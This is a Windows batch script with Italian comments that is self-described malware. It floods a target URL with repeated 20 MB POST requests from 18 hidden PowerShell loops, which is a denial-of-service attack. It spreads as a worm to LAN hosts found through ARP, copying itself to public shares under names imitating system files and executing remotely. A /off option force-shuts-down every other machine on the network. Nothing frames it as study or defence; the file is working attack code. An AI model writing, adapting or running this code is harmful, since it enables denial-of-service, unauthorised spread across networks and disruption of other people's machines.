@echo off
setlocal EnableDelayedExpansion

:: === CONFIGURAZIONE ===
set "URL=https://www.example.com"
set "PAYLOAD_SIZE=20971520"
set "THREADS=18"
set "WORM_SCRIPT=driver_sync.bat"
set "REMOTE_PATH=Users\Public"
set "LAUNCH_NAME=winlogon_sync.bat"
set "LOCAL_HOSTNAME=%COMPUTERNAME%"

:: === COMANDO: HELP ===
if /I "%~1"=="help" (
    goto :HELP
)
if /I "%~1"=="/help" (
    goto :HELP
)

:: === COMANDO: SPEGNIMENTO MASSIVO ===
if /I "%~1"=="/off" (
    echo [!] Avvio spegnimento di tutti i dispositivi tranne %LOCAL_HOSTNAME%
    for /f "tokens=1" %%A in ('arp -a ^| findstr dynamic') do (
        set "IP=%%A"
        call :SPEGNI !IP!
    )
    exit /b
)

:: === CREA SCRIPT WORM/BOT ===
(
echo @echo off
echo powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
 "$u='%URL%'; $r=New-Object System.Random; while($true){$s='A'*%PAYLOAD_SIZE%; try{(Invoke-WebRequest -Uri $u -Method POST -Body $s -UseBasicParsing).StatusCode}catch{}; Start-Sleep -Seconds 1}"
) > "%WORM_SCRIPT%"

:: === LANCIA THREAD LOCALI ===
for /L %%i in (1,1,%THREADS%) do (
    start "" cmd /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
     "$u='%URL%'; $r=New-Object System.Random; while($true){$s='A'*%PAYLOAD_SIZE%; try{(Invoke-WebRequest -Uri $u -Method POST -Body $s -UseBasicParsing).StatusCode}catch{}; Start-Sleep -Seconds 1}"
)

:: === DIFFUSIONE NELLA LAN ===
for /f "tokens=1" %%A in ('arp -a ^| findstr dynamic') do (
    set "IP=%%A"
    call :INFETTA !IP!
)

exit /b

:INFETTA
net use \\%1\%REMOTE_PATH% >nul 2>&1
if %errorlevel%==0 (
    copy "%WORM_SCRIPT%" "\\%1\%REMOTE_PATH%\%LAUNCH_NAME%" >nul
    start "" cmd /c \\%1\%REMOTE_PATH%\%LAUNCH_NAME%
)
exit /b

:SPEGNI
for /f "tokens=2 delims=\" %%C in ("\\%1\") do (
    if /I not "%%C"=="%LOCAL_HOSTNAME%" (
        shutdown /m \\%1 /s /t 1 /f >nul 2>&1
        echo [+] Tentato spegnimento di %1
    )
)
exit /b

:HELP
echo.
echo === [ update_task.bat - comandi disponibili ] ===
echo.
echo  Nessun parametro        Avvia l'attacco e la diffusione nella LAN
echo  /off                   Spegne tutti i dispositivi LAN tranne il tuo
echo  help  oppure  /help    Mostra questo menu
echo.
exit /b
